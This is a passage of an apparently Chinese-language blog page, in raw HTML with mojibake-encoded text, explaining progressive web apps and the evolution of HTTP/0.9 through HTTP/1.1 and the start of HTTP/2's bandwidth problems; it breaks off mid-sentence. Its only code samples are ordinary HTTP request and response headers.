href="#æ¸è¿›å¼ç½‘é¡µåº”ç”¨ï¼ˆPWAï¼‰" class="headerlink" title="æ¸è¿›å¼ç½‘é¡µåº”ç”¨ï¼ˆPWAï¼‰"></a>æ¸è¿›å¼ç½‘é¡µåº”ç”¨ï¼ˆPWAï¼‰</h2><p>PWAï¼Œå…¨ç§°æ˜¯ Progressive Web Appï¼Œå³â€œæ¸è¿›å¼ +Web åº”ç”¨â€ã€‚è‡³äºâ€œæ¸è¿›å¼â€ï¼Œä»ä¸‹é¢ä¸¤ä¸ªæ–¹é¢æ¥ç†è§£ï¼š</p><ul><li>ç«™åœ¨ Web åº”ç”¨å¼€å‘è€…æ¥è¯´ï¼ŒPWA æä¾›äº†ä¸€ä¸ªæ¸è¿›å¼çš„è¿‡æ¸¡æ–¹æ¡ˆï¼Œè®©æ™®é€šç«™ç‚¹é€æ­¥è¿‡æ¸¡åˆ° Web åº”ç”¨ã€‚é‡‡å–æ¸è¿›å¼å¯ä»¥é™ä½ç«™ç‚¹æ”¹é€ çš„ä»£ä»·ï¼Œä½¿å¾—ç«™ç‚¹é€æ­¥æ”¯æŒå„é¡¹æ–°æŠ€æœ¯ï¼Œè€Œä¸æ˜¯ä¸€æ­¥åˆ°ä½ã€‚</li><li>ç«™åœ¨æŠ€æœ¯è§’åº¦æ¥è¯´ï¼ŒPWA æŠ€æœ¯ä¹Ÿæ˜¯ä¸€ä¸ªæ¸è¿›å¼çš„æ¼”åŒ–è¿‡ç¨‹ï¼Œåœ¨æŠ€æœ¯å±‚é¢ä¼šä¸€ç‚¹ç‚¹æ¼”è¿›ï¼Œæ¯”å¦‚é€æ¸æä¾›æ›´å¥½çš„è®¾å¤‡ç‰¹æ€§æ”¯æŒï¼Œä¸æ–­ä¼˜åŒ–æ›´åŠ æµç•…çš„åŠ¨ç”»æ•ˆæœï¼Œä¸æ–­è®©é¡µé¢çš„åŠ è½½é€Ÿåº¦å˜å¾—æ›´å¿«ï¼Œä¸æ–­å®ç°æœ¬åœ°åº”ç”¨çš„ç‰¹æ€§ã€‚</li></ul><h1 id="æµè§ˆå™¨ä¸­çš„ç½‘ç»œ"><a href="#æµè§ˆå™¨ä¸­çš„ç½‘ç»œ" class="headerlink" title="æµè§ˆå™¨ä¸­çš„ç½‘ç»œ"></a>æµè§ˆå™¨ä¸­çš„ç½‘ç»œ</h1><h2 id="HTTP-1ï¼šHTTPæ€§èƒ½ä¼˜åŒ–"><a href="#HTTP-1ï¼šHTTPæ€§èƒ½ä¼˜åŒ–" class="headerlink" title="HTTP/1ï¼šHTTPæ€§èƒ½ä¼˜åŒ–"></a>HTTP/1ï¼šHTTPæ€§èƒ½ä¼˜åŒ–</h2><h3 id="è¶…æ–‡æœ¬ä¼ è¾“åè®®-HTTP-0-9"><a href="#è¶…æ–‡æœ¬ä¼ è¾“åè®®-HTTP-0-9" class="headerlink" title="è¶…æ–‡æœ¬ä¼ è¾“åè®® HTTP/0.9"></a>è¶…æ–‡æœ¬ä¼ è¾“åè®® HTTP/0.9</h3><p>HTTP/0.9 æ˜¯äº 1991 å¹´æå‡ºçš„ï¼Œä¸»è¦ç”¨äºå­¦æœ¯äº¤æµï¼Œéœ€æ±‚å¾ˆç®€å•â€”â€”ç”¨æ¥åœ¨ç½‘ç»œä¹‹é—´ä¼ é€’ HTML è¶…æ–‡æœ¬çš„å†…å®¹ï¼Œæ‰€ä»¥è¢«ç§°ä¸º<strong>è¶…æ–‡æœ¬ä¼ è¾“åè®®</strong>ã€‚</p><p>HTTP/0.9 çš„ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚æµç¨‹ï¼ˆå¯å‚è€ƒä¸‹å›¾ï¼‰ã€‚</p><ul><li>å› ä¸º HTTP éƒ½æ˜¯åŸºäº TCP åè®®çš„ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯å…ˆè¦æ ¹æ® IP åœ°å€ã€ç«¯å£å’ŒæœåŠ¡å™¨å»ºç«‹ TCP è¿æ¥ï¼Œè€Œå»ºç«‹è¿æ¥çš„è¿‡ç¨‹å°±æ˜¯ TCP åè®®ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ã€‚</li><li>å»ºç«‹å¥½è¿æ¥ä¹‹åï¼Œä¼šå‘é€ä¸€ä¸ª GET è¯·æ±‚è¡Œçš„ä¿¡æ¯ï¼Œå¦‚<code>GET /index.html</code>ç”¨æ¥è·å– index.htmlã€‚</li><li>æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚ä¿¡æ¯ä¹‹åï¼Œè¯»å–å¯¹åº”çš„ HTML æ–‡ä»¶ï¼Œå¹¶å°†æ•°æ®ä»¥ ASCII å­—ç¬¦æµè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li>HTML æ–‡æ¡£ä¼ è¾“å®Œæˆåï¼Œæ–­å¼€è¿æ¥ã€‚</li></ul><p><img src="https://i.loli.net/2021/06/14/D3WYz4wmiP9kc6C.jpg" alt="Snipaste_2021-06-14_20-35-44.jpg"></p><p>HTTP/0.9 çš„å®ç°æœ‰ä»¥ä¸‹ä¸‰ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯åªæœ‰ä¸€ä¸ªè¯·æ±‚è¡Œï¼Œå¹¶æ²¡æœ‰<strong>HTTP è¯·æ±‚å¤´å’Œè¯·æ±‚ä½“</strong>ï¼Œå› ä¸ºåªéœ€è¦ä¸€ä¸ªè¯·æ±‚è¡Œå°±å¯ä»¥å®Œæ•´è¡¨è¾¾å®¢æˆ·ç«¯çš„éœ€æ±‚äº†ã€‚</li><li>ç¬¬äºŒä¸ªæ˜¯æœåŠ¡å™¨ä¹Ÿæ²¡æœ‰è¿”å›å¤´ä¿¡æ¯ï¼Œè¿™æ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯å¹¶ä¸éœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯å¤ªå¤šä¿¡æ¯ï¼Œåªéœ€è¦è¿”å›æ•°æ®å°±å¯ä»¥äº†ã€‚</li><li>ç¬¬ä¸‰ä¸ªæ˜¯è¿”å›çš„æ–‡ä»¶å†…å®¹æ˜¯ä»¥ ASCII å­—ç¬¦æµæ¥ä¼ è¾“çš„ï¼Œå› ä¸ºéƒ½æ˜¯ HTML æ ¼å¼çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨ ASCII å­—èŠ‚ç æ¥ä¼ è¾“æ˜¯æœ€åˆé€‚çš„ã€‚</li></ul><h3 id="è¢«æµè§ˆå™¨æ¨åŠ¨çš„-HTTP-1-0"><a href="#è¢«æµè§ˆå™¨æ¨åŠ¨çš„-HTTP-1-0" class="headerlink" title="è¢«æµè§ˆå™¨æ¨åŠ¨çš„ HTTP/1.0"></a>è¢«æµè§ˆå™¨æ¨åŠ¨çš„ HTTP/1.0</h3><p>åœ¨æµè§ˆå™¨ä¸­å±•ç¤ºçš„ä¸å•æ˜¯ HTML æ–‡ä»¶äº†ï¼Œè¿˜åŒ…æ‹¬äº† JavaScriptã€CSSã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ä¸åŒç±»å‹çš„æ–‡ä»¶ã€‚å› æ­¤<strong>æ”¯æŒå¤šç§ç±»å‹çš„æ–‡ä»¶ä¸‹è½½æ˜¯ HTTP/1.0 çš„ä¸€ä¸ªæ ¸å¿ƒè¯‰æ±‚</strong>ï¼Œè€Œä¸”æ–‡ä»¶æ ¼å¼ä¸ä»…ä»…å±€é™äº ASCII ç¼–ç ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–ç±»å‹ç¼–ç çš„æ–‡ä»¶ã€‚</p><p>ä¸ºäº†è®©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨èƒ½æ›´æ·±å…¥åœ°äº¤æµï¼ŒHTTP/1.0 å¼•å…¥äº†è¯·æ±‚å¤´å’Œå“åº”å¤´ï¼Œå®ƒä»¬éƒ½æ˜¯ä»¥ä¸º Key-Value å½¢å¼ä¿å­˜çš„ï¼Œåœ¨ HTTP å‘é€è¯·æ±‚æ—¶ï¼Œä¼šå¸¦ä¸Šè¯·æ±‚å¤´ä¿¡æ¯ï¼ŒæœåŠ¡å™¨è¿”å›æ•°æ®æ—¶ï¼Œä¼šå…ˆè¿”å›å“åº”å¤´ä¿¡æ¯ã€‚è‡³äº HTTP/1.0 å…·ä½“çš„è¯·æ±‚æµç¨‹ï¼Œä½ å¯ä»¥å‚è€ƒä¸‹å›¾ã€‚</p><p><img src="https://i.loli.net/2021/06/14/21fcJbhFNno7Dqv.jpg" alt="Snipaste_2021-06-14_20-37-24.jpg"></p><p>HTTP/1.0 é€šè¿‡è¯·æ±‚å¤´å’Œå“åº”å¤´æ¥è¿›è¡Œåå•†ï¼Œåœ¨å‘èµ·è¯·æ±‚æ—¶å€™ä¼šé€šè¿‡ HTTP è¯·æ±‚å¤´å‘Šè¯‰æœåŠ¡å™¨å®ƒæœŸå¾…æœåŠ¡å™¨è¿”å›ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ã€é‡‡å–ä»€ä¹ˆå½¢å¼çš„å‹ç¼©ã€æä¾›ä»€ä¹ˆè¯­è¨€çš„æ–‡ä»¶ä»¥åŠæ–‡ä»¶çš„å…·ä½“ç¼–ç ã€‚æœ€ç»ˆå‘é€å‡ºæ¥çš„è¯·æ±‚å¤´å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accept: text/html</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-Charset: ISO-8859-1,utf-8</span><br><span class="line">accept-language: zh-CN,zh</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºæœŸæœ›æœåŠ¡å™¨è¿”å› html ç±»å‹çš„æ–‡ä»¶ï¼Œç¬¬äºŒè¡Œè¡¨ç¤ºæœŸæœ›æœåŠ¡å™¨å¯ä»¥é‡‡ç”¨ gzipã€deflate æˆ–è€… br å…¶ä¸­çš„ä¸€ç§å‹ç¼©æ–¹å¼ï¼Œç¬¬ä¸‰è¡Œè¡¨ç¤ºæœŸæœ›è¿”å›çš„æ–‡ä»¶ç¼–ç æ˜¯ UTF-8 æˆ–è€… ISO-8859-1ï¼Œç¬¬å››è¡Œæ˜¯è¡¨ç¤ºæœŸæœ›é¡µé¢çš„ä¼˜å…ˆè¯­è¨€æ˜¯ä¸­æ–‡ã€‚</p><p>æœåŠ¡å™¨æ¥æ”¶åˆ°æµè§ˆå™¨å‘é€è¿‡æ¥çš„è¯·æ±‚å¤´ä¿¡æ¯ä¹‹åï¼Œä¼šæ ¹æ®è¯·æ±‚å¤´çš„ä¿¡æ¯æ¥å‡†å¤‡å“åº”æ•°æ®ã€‚ä¸è¿‡æœ‰æ—¶å€™ä¼šæœ‰ä¸€äº›æ„å¤–æƒ…å†µå‘ç”Ÿï¼Œæ¯”å¦‚æµè§ˆå™¨è¯·æ±‚çš„å‹ç¼©ç±»å‹æ˜¯ gzipï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸æ”¯æŒ gzipï¼Œåªæ”¯æŒ br å‹ç¼©ï¼Œé‚£ä¹ˆå®ƒä¼šé€šè¿‡å“åº”å¤´ä¸­çš„ content-encoding å­—æ®µå‘Šè¯‰æµè§ˆå™¨æœ€ç»ˆçš„å‹ç¼©ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆæµè§ˆå™¨éœ€è¦æ ¹æ®å“åº”å¤´çš„ä¿¡æ¯æ¥å¤„ç†æ•°æ®ã€‚ä¸‹é¢æ˜¯ä¸€æ®µå“åº”å¤´çš„æ•°æ®ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content-encoding: br</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºæœåŠ¡å™¨é‡‡ç”¨äº† br çš„å‹ç¼©æ–¹æ³•ï¼Œç¬¬äºŒè¡Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›çš„æ˜¯ html æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶çš„ç¼–ç ç±»å‹æ˜¯ UTF-8ã€‚</p><p>HTTP/1.0 é™¤äº†å¯¹å¤šæ–‡ä»¶æä¾›è‰¯å¥½çš„æ”¯æŒå¤–ï¼Œè¿˜ä¾æ®å½“æ—¶å®é™…çš„éœ€æ±‚å¼•å…¥äº†å¾ˆå¤šå…¶ä»–çš„ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§éƒ½æ˜¯é€šè¿‡è¯·æ±‚å¤´å’Œå“åº”å¤´æ¥å®ç°çš„ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹æ–°å¢çš„å‡ ä¸ªå…¸å‹çš„ç‰¹æ€§ï¼š</p><ul><li>æœ‰çš„è¯·æ±‚æœåŠ¡å™¨å¯èƒ½æ— æ³•å¤„ç†ï¼Œæˆ–è€…å¤„ç†å‡ºé”™ï¼Œè¿™æ—¶å€™å°±éœ€è¦å‘Šè¯‰æµè§ˆå™¨æœåŠ¡å™¨æœ€ç»ˆå¤„ç†è¯¥è¯·æ±‚çš„æƒ…å†µï¼Œè¿™å°±å¼•å…¥äº†<strong>çŠ¶æ€ç </strong>ã€‚çŠ¶æ€ç æ˜¯é€šè¿‡å“åº”è¡Œçš„æ–¹å¼æ¥é€šçŸ¥æµè§ˆå™¨çš„ã€‚</li><li>ä¸ºäº†å‡è½»æœåŠ¡å™¨çš„å‹åŠ›ï¼Œåœ¨ HTTP/1.0 ä¸­æä¾›äº†<strong>Cache æœºåˆ¶</strong>ï¼Œç”¨æ¥ç¼“å­˜å·²ç»ä¸‹è½½è¿‡çš„æ•°æ®ã€‚</li><li>æœåŠ¡å™¨éœ€è¦ç»Ÿè®¡å®¢æˆ·ç«¯çš„åŸºç¡€ä¿¡æ¯ï¼Œæ¯”å¦‚ Windows å’Œ macOS çš„ç”¨æˆ·æ•°é‡åˆ†åˆ«æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥ HTTP/1.0 çš„è¯·æ±‚å¤´ä¸­è¿˜åŠ å…¥äº†<strong>ç”¨æˆ·ä»£ç†</strong>çš„å­—æ®µã€‚</li></ul><h3 id="ç¼ç¼è¡¥è¡¥çš„-HTTP-1-1"><a href="#ç¼ç¼è¡¥è¡¥çš„-HTTP-1-1" class="headerlink" title="ç¼ç¼è¡¥è¡¥çš„ HTTP/1.1"></a>ç¼ç¼è¡¥è¡¥çš„ HTTP/1.1</h3><h4 id="1-æ”¹è¿›æŒä¹…è¿æ¥"><a href="#1-æ”¹è¿›æŒä¹…è¿æ¥" class="headerlink" title="1. æ”¹è¿›æŒä¹…è¿æ¥"></a>1. æ”¹è¿›æŒä¹…è¿æ¥</h4><p>HTTP/1.0 æ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡ï¼Œéƒ½éœ€è¦ç»å†å»ºç«‹ TCP è¿æ¥ã€ä¼ è¾“ HTTP æ•°æ®å’Œæ–­å¼€ TCP è¿æ¥ä¸‰ä¸ªé˜¶æ®µã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ<strong>HTTP/1.1 ä¸­å¢åŠ äº†æŒä¹…è¿æ¥çš„æ–¹æ³•ï¼Œå®ƒçš„ç‰¹ç‚¹æ˜¯åœ¨ä¸€ä¸ª TCP è¿æ¥ä¸Šå¯ä»¥ä¼ è¾“å¤šä¸ª HTTP è¯·æ±‚ï¼Œåªè¦æµè§ˆå™¨æˆ–è€…æœåŠ¡å™¨æ²¡æœ‰æ˜ç¡®æ–­å¼€è¿æ¥ï¼Œé‚£ä¹ˆè¯¥ TCP è¿æ¥ä¼šä¸€ç›´ä¿æŒ</strong>ã€‚</p><p>HTTP çš„æŒä¹…è¿æ¥å¯ä»¥æœ‰æ•ˆå‡å°‘ TCP å»ºç«‹è¿æ¥å’Œæ–­å¼€è¿æ¥çš„æ¬¡æ•°ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯å‡å°‘äº†æœåŠ¡å™¨é¢å¤–çš„è´Ÿæ‹…ï¼Œå¹¶æå‡æ•´ä½“ HTTP çš„è¯·æ±‚æ—¶é•¿ã€‚æŒä¹…è¿æ¥åœ¨ HTTP/1.1 ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå¦‚æœä¸æƒ³è¦é‡‡ç”¨æŒä¹…è¿æ¥ï¼Œå¯ä»¥åœ¨ HTTP è¯·æ±‚å¤´ä¸­åŠ ä¸Š<code>Connection: close</code>ã€‚ç›®å‰æµè§ˆå™¨ä¸­å¯¹äºåŒä¸€ä¸ªåŸŸåï¼Œé»˜è®¤å…è®¸åŒæ—¶å»ºç«‹ 6 ä¸ª TCP æŒä¹…è¿æ¥ã€‚</p><h4 id="2-ä¸æˆç†Ÿçš„-HTTP-ç®¡çº¿åŒ–"><a href="#2-ä¸æˆç†Ÿçš„-HTTP-ç®¡çº¿åŒ–" class="headerlink" title="2. ä¸æˆç†Ÿçš„ HTTP ç®¡çº¿åŒ–"></a>2. ä¸æˆç†Ÿçš„ HTTP ç®¡çº¿åŒ–</h4><p>æŒä¹…è¿æ¥è™½ç„¶èƒ½å‡å°‘ TCP çš„å»ºç«‹å’Œæ–­å¼€æ¬¡æ•°ï¼Œä½†æ˜¯å®ƒéœ€è¦ç­‰å¾…å‰é¢çš„è¯·æ±‚è¿”å›ä¹‹åï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚å¦‚æœ TCP é€šé“ä¸­çš„æŸä¸ªè¯·æ±‚å› ä¸ºæŸäº›åŸå› æ²¡æœ‰åŠæ—¶è¿”å›ï¼Œé‚£ä¹ˆå°±ä¼šé˜»å¡åé¢çš„æ‰€æœ‰è¯·æ±‚ï¼Œè¿™å°±æ˜¯è‘—åçš„<strong>é˜Ÿå¤´é˜»å¡</strong>çš„é—®é¢˜ã€‚</p><p>HTTP/1.1 ä¸­è¯•å›¾é€šè¿‡ç®¡çº¿åŒ–çš„æŠ€æœ¯æ¥è§£å†³<strong>é˜Ÿå¤´é˜»å¡</strong>çš„é—®é¢˜ã€‚HTTP/1.1 ä¸­çš„ç®¡çº¿åŒ–æ˜¯æŒ‡å°†å¤šä¸ª HTTP è¯·æ±‚æ•´æ‰¹æäº¤ç»™æœåŠ¡å™¨çš„æŠ€æœ¯ï¼Œè™½ç„¶å¯ä»¥æ•´æ‰¹å‘é€è¯·æ±‚ï¼Œä¸è¿‡æœåŠ¡å™¨ä¾ç„¶éœ€è¦æ ¹æ®è¯·æ±‚é¡ºåºæ¥å›å¤æµè§ˆå™¨çš„è¯·æ±‚ã€‚</p><h4 id="3-æä¾›è™šæ‹Ÿä¸»æœºçš„æ”¯æŒ"><a href="#3-æä¾›è™šæ‹Ÿä¸»æœºçš„æ”¯æŒ" class="headerlink" title="3. æä¾›è™šæ‹Ÿä¸»æœºçš„æ”¯æŒ"></a>3. æä¾›è™šæ‹Ÿä¸»æœºçš„æ”¯æŒ</h4><p>åœ¨ HTTP/1.0 ä¸­ï¼Œæ¯ä¸ªåŸŸåç»‘å®šäº†ä¸€ä¸ªå”¯ä¸€çš„ IP åœ°å€ï¼Œå› æ­¤ä¸€ä¸ªæœåŠ¡å™¨åªèƒ½æ”¯æŒä¸€ä¸ªåŸŸåã€‚ä½†æ˜¯éšç€è™šæ‹Ÿä¸»æœºæŠ€æœ¯çš„å‘å±•ï¼Œéœ€è¦å®ç°åœ¨ä¸€å°ç‰©ç†ä¸»æœºä¸Šç»‘å®šå¤šä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºéƒ½æœ‰è‡ªå·±çš„å•ç‹¬çš„åŸŸåï¼Œè¿™äº›å•ç‹¬çš„åŸŸåéƒ½å…¬ç”¨åŒä¸€ä¸ª IP åœ°å€ã€‚</p><p>å› æ­¤ï¼ŒHTTP/1.1 çš„è¯·æ±‚å¤´ä¸­å¢åŠ äº†<strong>Host å­—æ®µ</strong>ï¼Œç”¨æ¥è¡¨ç¤ºå½“å‰çš„åŸŸååœ°å€ï¼Œè¿™æ ·æœåŠ¡å™¨å°±å¯ä»¥æ ¹æ®ä¸åŒçš„ Host å€¼åšä¸åŒçš„å¤„ç†ã€‚</p><h4 id="4-å¯¹åŠ¨æ€ç”Ÿæˆçš„å†…å®¹æä¾›äº†å®Œç¾æ”¯æŒ"><a href="#4-å¯¹åŠ¨æ€ç”Ÿæˆçš„å†…å®¹æä¾›äº†å®Œç¾æ”¯æŒ" class="headerlink" title="4. å¯¹åŠ¨æ€ç”Ÿæˆçš„å†…å®¹æä¾›äº†å®Œç¾æ”¯æŒ"></a>4. å¯¹åŠ¨æ€ç”Ÿæˆçš„å†…å®¹æä¾›äº†å®Œç¾æ”¯æŒ</h4><p>åœ¨è®¾è®¡ HTTP/1.0 æ—¶ï¼Œéœ€è¦åœ¨å“åº”å¤´ä¸­è®¾ç½®å®Œæ•´çš„æ•°æ®å¤§å°ï¼Œå¦‚<code>Content-Length: 901</code>ï¼Œè¿™æ ·æµè§ˆå™¨å°±å¯ä»¥æ ¹æ®è®¾ç½®çš„æ•°æ®å¤§å°æ¥æ¥æ”¶æ•°æ®ã€‚ä¸è¿‡éšç€æœåŠ¡å™¨ç«¯çš„æŠ€æœ¯å‘å±•ï¼Œå¾ˆå¤šé¡µé¢çš„å†…å®¹éƒ½æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œå› æ­¤åœ¨ä¼ è¾“æ•°æ®ä¹‹å‰å¹¶ä¸çŸ¥é“æœ€ç»ˆçš„æ•°æ®å¤§å°ï¼Œè¿™å°±å¯¼è‡´äº†æµè§ˆå™¨ä¸çŸ¥é“ä½•æ—¶ä¼šæ¥æ”¶å®Œæ‰€æœ‰çš„æ–‡ä»¶æ•°æ®ã€‚</p><p>HTTP/1.1 é€šè¿‡å¼•å…¥<strong>Chunk transfer æœºåˆ¶</strong>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒæœåŠ¡å™¨ä¼šå°†æ•°æ®åˆ†å‰²æˆè‹¥å¹²ä¸ªä»»æ„å¤§å°çš„æ•°æ®å—ï¼Œæ¯ä¸ªæ•°æ®å—å‘é€æ—¶ä¼šé™„ä¸Šä¸Šä¸ªæ•°æ®å—çš„é•¿åº¦ï¼Œæœ€åä½¿ç”¨ä¸€ä¸ªé›¶é•¿åº¦çš„å—ä½œä¸ºå‘é€æ•°æ®å®Œæˆçš„æ ‡å¿—ã€‚è¿™æ ·å°±æä¾›äº†å¯¹åŠ¨æ€å†…å®¹çš„æ”¯æŒã€‚</p><h4 id="5-å®¢æˆ·ç«¯-Cookieã€å®‰å…¨æœºåˆ¶"><a href="#5-å®¢æˆ·ç«¯-Cookieã€å®‰å…¨æœºåˆ¶" class="headerlink" title="5. å®¢æˆ·ç«¯ Cookieã€å®‰å…¨æœºåˆ¶"></a>5. å®¢æˆ·ç«¯ Cookieã€å®‰å…¨æœºåˆ¶</h4><h2 id="HTTP-2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ï¼Ÿ"><a href="#HTTP-2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ï¼Ÿ" class="headerlink" title="HTTP/2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ï¼Ÿ"></a>HTTP/2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ï¼Ÿ</h2><h3 id="HTTP-1-1-çš„ä¸»è¦é—®é¢˜"><a href="#HTTP-1-1-çš„ä¸»è¦é—®é¢˜" class="headerlink" title="HTTP/1.1 çš„ä¸»è¦é—®é¢˜"></a>HTTP/1.1 çš„ä¸»è¦é—®é¢˜</h3><p> HTTP/1.1<strong>å¯¹å¸¦å®½çš„åˆ©ç”¨ç‡å´å¹¶ä¸ç†æƒ³</strong>ï¼Œè¿™ä¹Ÿæ˜¯ HTTP/1.1 çš„ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ã€‚<strong>å¸¦å®½æ˜¯æŒ‡æ¯ç§’æœ€å¤§èƒ½å‘é€æˆ–è€…æ¥æ”¶çš„å­—èŠ‚æ•°</strong>ã€‚æˆ‘ä»¬æŠŠæ¯ç§’èƒ½å‘é€çš„æœ€å¤§å­—èŠ‚æ•°ç§°ä¸º<strong>ä¸Šè¡Œå¸¦å®½</strong>ï¼Œæ¯ç§’èƒ½å¤Ÿæ¥æ”¶çš„æœ€å¤§å­—èŠ‚æ•°ç§°ä¸º<strong>ä¸‹è¡Œå¸¦å®½</strong>ã€‚</p><p>HTTP/1.1 å¾ˆéš¾å°†å¸¦å®½ç”¨æ»¡ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è¯´çš„ 100M å¸¦å®½ï¼Œå®é™…çš„ä¸‹è½½é€Ÿåº¦èƒ½è¾¾åˆ° 12.5M/Sï¼Œè€Œé‡‡ç”¨ HTTP/1.1 æ—¶ï¼Œä¹Ÿè®¸åœ¨åŠ è½½é¡µé¢èµ„æºæ—¶æœ€å¤§åªèƒ½ä½¿ç”¨åˆ° 2.5M/Sï¼Œå¾ˆéš¾å°† 12.5M å…¨éƒ¨ç”¨æ»¡ã€‚</p><p>ä¹‹æ‰€ä»¥ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œä¸»è¦æ˜¯ç”±ä»¥ä¸‹ä¸‰ä¸ªåŸå› å¯¼è‡´çš„ã€‚</p><p><strong>ç¬¬ä¸€ä¸ªåŸå› ï¼ŒTCP çš„æ…¢å¯åŠ¨ã€‚</strong>ä¹‹æ‰€ä»¥è¯´æ…¢å¯åŠ¨ä¼šå¸¦æ¥æ€§èƒ½é—®é¢˜ï¼Œæ˜¯å› ä¸ºé¡µé¢ä¸­å¸¸ç”¨çš„ä¸€äº›å…³é”®èµ„æºæ–‡ä»¶æœ¬æ¥å°±ä¸å¤§ï¼Œå¦‚ HTML æ–‡ä»¶ã€CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶ï¼Œé€šå¸¸è¿™äº›æ–‡ä»¶åœ¨ TCP è¿æ¥å»ºç«‹å¥½ä¹‹åå°±è¦å‘èµ·è¯·æ±‚çš„ï¼Œä½†è¿™ä¸ªè¿‡ç¨‹æ˜¯æ…¢å¯åŠ¨ï¼Œæ‰€ä»¥è€—è´¹çš„æ—¶é—´æ¯”æ­£å¸¸çš„æ—¶é—´è¦å¤šå¾ˆå¤šï¼Œè¿™æ ·å°±æ¨è¿Ÿäº†å®è´µçš„é¦–æ¬¡æ¸²æŸ“é¡µé¢çš„æ—¶é•¿äº†ã€‚</p><p><strong>ç¬¬äºŒä¸ªåŸå› ï¼ŒåŒæ—¶å¼€å¯äº†å¤šæ¡ TCP è¿æ¥ï¼Œé‚£ä¹ˆè¿™äº›è¿æ¥ä¼šç«äº‰å›ºå®šçš„å¸¦å®½ã€‚</strong>ç³»ç»ŸåŒæ—¶å»ºç«‹äº†å¤šæ¡ TCP è¿æ¥ï¼Œå½“å¸¦å®½å……è¶³æ—¶ï¼Œæ¯æ¡è¿æ¥å‘é€æˆ–è€…æ¥æ”¶é€Ÿåº¦ä¼šæ…¢æ…¢å‘ä¸Šå¢åŠ ï¼›è€Œä¸€æ—¦å¸¦å®½ä¸è¶³æ—¶ï¼Œè¿™äº› TCP è¿æ¥åˆä¼šå‡æ…¢å‘é€æˆ–è€…æ¥æ”¶çš„é€Ÿåº¦ã€‚æ¯”å¦‚ä¸€ä¸ªé¡µé¢æœ‰ 200 ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨äº† 3 ä¸ª CDNï¼Œé‚£ä¹ˆåŠ è½½è¯¥ç½‘é¡µçš„æ—¶å€™å°±éœ€è¦å»ºç«‹ 6 * 3ï¼Œä¹Ÿå°±æ˜¯ 18 ä¸ª TCP è¿æ¥æ¥ä¸‹è½½èµ„æºï¼›åœ¨ä¸‹è½½è¿‡ç¨‹ä¸­ï¼Œå½“å‘ç°å¸¦å®½ä¸è¶³çš„æ—¶å€™ï¼Œå„ä¸ª TCP è¿æ¥å°±éœ€è¦åŠ¨æ€å‡æ…¢æ¥æ”¶æ•°æ®çš„é€Ÿåº¦ã€‚</p><p>æœ‰çš„ TCP è¿æ¥ä¸‹è½½çš„æ˜¯ä¸€äº›å…³é”®èµ„æºï¼Œå¦‚ CSS æ–‡ä»¶ã€JavaScript æ–‡ä»¶ç­‰ï¼Œè€Œæœ‰çš„ TCP è¿æ¥ä¸‹è½½çš„æ˜¯å›¾ç‰‡ã€è§†é¢‘ç­‰æ™®é€šçš„èµ„æºæ–‡ä»¶ï¼Œä½†æ˜¯å¤šæ¡ TCP è¿æ¥ä¹‹é—´åˆä¸èƒ½åå•†è®©å“ªäº›å…³é”®èµ„æºä¼˜å…ˆä¸‹è½½ï¼Œè¿™æ ·å°±æœ‰å¯èƒ½å½±å“é‚£äº›å…³é”®èµ„æºçš„ä¸‹è½½é€Ÿåº¦äº†ã€‚</p><p><strong>ç¬¬ä¸‰ä¸ªåŸå› ï¼ŒHTTP/1.1 é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚</strong>åœ¨ HTTP/1.1 ä¸­ä½¿ç”¨æŒä¹…è¿æ¥æ—¶ï¼Œè™½ç„¶èƒ½å…¬ç”¨ä¸€ä¸ª TCP 